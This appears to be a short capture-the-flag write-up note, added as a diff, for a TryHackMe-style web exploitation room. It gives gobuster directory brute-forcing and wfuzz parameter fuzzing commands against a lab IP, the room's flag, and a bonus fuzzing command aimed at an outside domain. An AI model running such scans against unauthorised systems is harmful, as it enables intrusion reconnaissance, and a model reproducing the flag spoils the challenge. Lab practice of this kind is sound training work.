@@ -1,0 +1,19 @@
+Santa's watching - Web Exploitation
+
+machine ip: 10.10.85.131
+
+./gobuster dir -u http://10.10.85.131 -w ./wordlist.txt -x php,txt,html
+
+http://10.10.85.131/api/
+
+http://10.10.85.131/api/site-log.php with 'date' parameter
+
+wfuzz -c -z file,./wordlist.txt -u http://10.10.85.131/api/site-log.php?date=FUZZ
+
+wfuzz -c -z file,./wordlist.txt -d date=FUZZ” -u http://10.10.85.131/api/site-log.php
+
+THM{D4t3_AP1}
+
+*** Bonus question
+
+wfuzz -z file,big.txt -u http://shibes.xyz/api.php?breed=FUZZ
